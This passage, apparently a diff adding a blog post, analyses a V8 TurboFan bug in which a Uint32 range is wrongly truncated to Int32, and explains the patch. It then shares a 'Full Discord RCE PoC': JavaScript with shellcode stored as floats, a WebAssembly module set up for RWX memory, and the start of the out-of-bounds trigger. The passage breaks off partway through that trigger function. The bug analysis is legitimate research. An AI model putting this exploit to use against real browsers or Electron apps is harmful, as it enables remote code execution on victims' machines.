+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span> }
+</span></span></code></pre></div><p>Let’s discard #14:NumberConstant input node from here which is not relevant. The relevant input node is #52:Select, the use_info.representation() [1] will be kWord32 as we figured, so the <strong>GetWord32RepresentationFor [2]</strong> function is called with the same variables from previous GetRepresentationFor[3], but just input_ part in variable is renamed output_</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>Node<span style="color:#f92672">*</span> RepresentationChanger<span style="color:#f92672">::</span>GetRepresentationFor(  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>   Node<span style="color:#f92672">*</span> node, MachineRepresentation output_rep, Type output_type,  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>   Node<span style="color:#f92672">*</span> use_node, UseInfo use_info) {  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>[..]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span><span style="color:#66d9ef">switch</span> (use_info.representation()) {<span style="color:#75715e">//kword32, the less than operation left side node usually makes this [1]  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span><span style="color:#75715e"></span>   <span style="color:#66d9ef">case</span> MachineRepresentation<span style="color:#f92672">::</span>kWord32:  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>     <span style="color:#66d9ef">return</span> GetWord32RepresentationFor(node, output_rep, output_type, use_node,  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>                                       use_info); [<span style="color:#ae81ff">2</span>]
+</span></span></code></pre></div><p>Now we reached exactly to the point where the code is patched in the fix.</p>
+<p>For the #52:Select input node these are the variables.</p>
+<ul>
+<li>//input=Select, output_rep=kRepWord64, output_type=Range(0,0xFFFF_FFFF), use_node=SpeculativeNumberLessThan</li>
+<li>//use=UseInfo(MachineRepresentation::kWord32, Truncation::Any(identify_zeros), TypeCheckKind::kSignedSmall,</li>
+</ul>
+<p>As outpu_rep is kRepWord64 we will take the [1] switch case. Using the output_type Range the Type is determined by calling output_type.Is(Type::Unsigned32()) at [2]. Essentially what it does is at [3], the range is checked to see what type of representation it comes under either Signed32 or UnSigned32.  The Range(0,0xFFFF_FFFF) is obviously not Signed32(0x8000_0000, 0xFFFF_FFFF). But it is the Unsigned32()(0, 0xFFFF_FFFF) exactly. <strong>The if condition is satisfied so the new node is created with “op = machine()-&gt;TruncateInt64ToInt32();” and inserted in between #52:Select and #41:SpeculativeNumberLessThan.</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>Node<span style="color:#f92672">*</span> RepresentationChanger<span style="color:#f92672">::</span>GetWord32RepresentationFor(  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>   Node<span style="color:#f92672">*</span> node, MachineRepresentation output_rep, Type output_type,  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>   Node<span style="color:#f92672">*</span> use_node, UseInfo use_info) {  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span> <span style="color:#75715e">// Eagerly fold representation changes for constants.  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#75715e"></span>[...]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>} <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (output_rep <span style="color:#f92672">==</span> MachineRepresentation<span style="color:#f92672">::</span>kWord64) { [<span style="color:#ae81ff">1</span>]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>   <span style="color:#66d9ef">if</span> (output_type.Is(Type<span style="color:#f92672">::</span>Signed32()) <span style="color:#f92672">||</span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>       output_type.Is(Type<span style="color:#f92672">::</span>Unsigned32())) { [<span style="color:#ae81ff">2</span>]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>     op <span style="color:#f92672">=</span> machine()<span style="color:#f92672">-&gt;</span>TruncateInt64ToInt32(); [<span style="color:#ae81ff">4</span>]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>   }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>[...]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#66d9ef">return</span> InsertConversion(node, op, use_node);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span><span style="color:#75715e">// Check if [this] &lt;= [that].//src/compiler/turbofan-types.cc  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span><span style="color:#75715e"></span><span style="color:#66d9ef">bool</span> Type<span style="color:#f92672">::</span>SlowIs(Type that) <span style="color:#66d9ef">const</span> {  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span> DisallowGarbageCollection no_gc;  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span><span style="color:#75715e">//[...] isRange(0, 4294967295) of select matches with 32-bit unsigned integer  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span><span style="color:#75715e"></span> <span style="color:#66d9ef">if</span> (that.IsRange()) {  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>   <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>IsRange() <span style="color:#f92672">&amp;&amp;</span> Contains(that.AsRange(), <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>AsRange()); [<span style="color:#ae81ff">3</span>]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span> }
+</span></span></code></pre></div><p>That’s how this bug surfaced. In the patch, a new condition is added at [1]: if only <code>use_info.type_check() == TypeCheckKind::kNone</code> and <code>output_type</code> is <code>Unsigned32</code>, then a truncation node is added. This essentially means if the node that uses this input doesn’t need any type checks then use this if not use the CheckedUnint64ToInt32[2] which checks for overflows. What a subtle bug.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">if</span> (output_type.<span style="color:#a6e22e">Is</span>(Type<span style="color:#f92672">::</span><span style="color:#a6e22e">Signed32</span>()) <span style="color:#f92672">||</span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>       (output_type.<span style="color:#a6e22e">Is</span>(Type<span style="color:#f92672">::</span><span style="color:#a6e22e">Unsigned32</span>()) <span style="color:#f92672">&amp;&amp;</span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>        use_info.<span style="color:#a6e22e">type_check</span>() <span style="color:#f92672">==</span> TypeCheckKind<span style="color:#f92672">::</span>kNone) <span style="color:#f92672">||</span> [<span style="color:#ae81ff">1</span>]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>       (output_type.<span style="color:#a6e22e">Is</span>(cache_<span style="color:#f92672">-&gt;</span>kSafeInteger) <span style="color:#f92672">&amp;&amp;</span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>        use_info.<span style="color:#a6e22e">truncation</span>().<span style="color:#a6e22e">IsUsedAsWord32</span>())) {  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>     op <span style="color:#f92672">=</span> <span style="color:#a6e22e">machine</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">TruncateInt64ToInt32</span>();  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (use_info.<span style="color:#a6e22e">type_check</span>() <span style="color:#f92672">==</span> TypeCheckKind<span style="color:#f92672">::</span>kSignedSmall <span style="color:#f92672">||</span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>              use_info.<span style="color:#a6e22e">type_check</span>() <span style="color:#f92672">==</span> TypeCheckKind<span style="color:#f92672">::</span>kSigned32 <span style="color:#f92672">||</span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>              use_info.<span style="color:#a6e22e">type_check</span>() <span style="color:#f92672">==</span> TypeCheckKind<span style="color:#f92672">::</span>kArrayIndex) {  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>     <span style="color:#66d9ef">if</span> (output_type.<span style="color:#a6e22e">Is</span>(cache_<span style="color:#f92672">-&gt;</span>kPositiveSafeInteger)) {  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>       op <span style="color:#f92672">=</span> <span style="color:#a6e22e">simplified</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">CheckedUint64ToInt32</span>(use_info.<span style="color:#a6e22e">feedback</span>()); [<span style="color:#ae81ff">2</span>]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>     }
+</span></span></code></pre></div><p>I’m really curious how these experts find such amazing bugs, these bugs like these are incredibly subtle and complex. Are they using fuzzing techniques, I wonder if this is found via fuzzing or is it just countless hours spent debugging and studying the source code? Respect anyway.</p>
+<h3 id="full-discord-rce-poc">Full Discord RCE PoC</h3>
+<p>Sharing the PoC but to understand how it works checkout the video on Youtube on how the exploit works after Out-of-bound access.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">conversion_buffer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">float_view</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#a6e22e">conversion_buffer</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">int_view</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BigUint64Array</span>(<span style="color:#a6e22e">conversion_buffer</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#a6e22e">BigInt</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">hex</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;0x&#39;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>};
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#a6e22e">BigInt</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">i2f</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    <span style="color:#a6e22e">int_view</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">float_view</span>[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>Number.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">f2i</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    <span style="color:#a6e22e">float_view</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">int_view</span>[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">gc</span>() {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>		<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span>((<span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span>)<span style="color:#f92672">/</span><span style="color:#ae81ff">0x10</span>); <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>			  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> String();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>		}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">shellcode</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">2.40327734437787</span><span style="color:#a6e22e">e</span><span style="color:#f92672">-</span><span style="color:#ae81ff">310</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1.1389104046892079</span><span style="color:#a6e22e">e</span><span style="color:#f92672">-</span><span style="color:#ae81ff">244</span>, <span style="color:#ae81ff">3.1731330715403803</span><span style="color:#a6e22e">e</span><span style="color:#f92672">+</span><span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">1.9656830452398213</span><span style="color:#a6e22e">e</span><span style="color:#f92672">-</span><span style="color:#ae81ff">236</span>, <span style="color:#ae81ff">1.288531947997</span><span style="color:#a6e22e">e</span><span style="color:#f92672">-</span><span style="color:#ae81ff">312</span>, <span style="color:#ae81ff">8.3024907661975715</span><span style="color:#a6e22e">e</span><span style="color:#f92672">+</span><span style="color:#ae81ff">270</span>, <span style="color:#ae81ff">1.6469439731597732</span><span style="color:#a6e22e">e</span><span style="color:#f92672">+</span><span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">9.026845734376378</span><span style="color:#a6e22e">e</span><span style="color:#f92672">-</span><span style="color:#ae81ff">308</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">pwn</span>() {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>    <span style="color:#75715e">/* Prepare RWX */</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">buffer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>([<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">115</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">133</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">96</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">127</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">130</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">112</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">131</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">129</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">145</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">111</span>,<span style="color:#ae81ff">114</span>,<span style="color:#ae81ff">121</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">138</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">65</span>,<span style="color:#ae81ff">42</span>,<span style="color:#ae81ff">11</span>]);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">module</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Module</span>(<span style="color:#a6e22e">buffer</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">instance</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Instance</span>(<span style="color:#a6e22e">module</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">exec_shellcode</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">main</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">f</span>(<span style="color:#a6e22e">a</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">a</span>) <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFFFFFFF</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">oob_smi</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Array(Math.<span style="color:#a6e22e">sign</span>(<span style="color:#ae81ff">0</span> <span style="color:#f92672">-</span> Math.<span style="color:#a6e22e">max</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">x</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)));
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span><span>        <span style="color:#a6e22e">oob_smi</span>.<span style="color:#a6e22e">pop</span>();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">oob_double</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">3.14</span>, <span style="color:#ae81ff">3.14</span>];
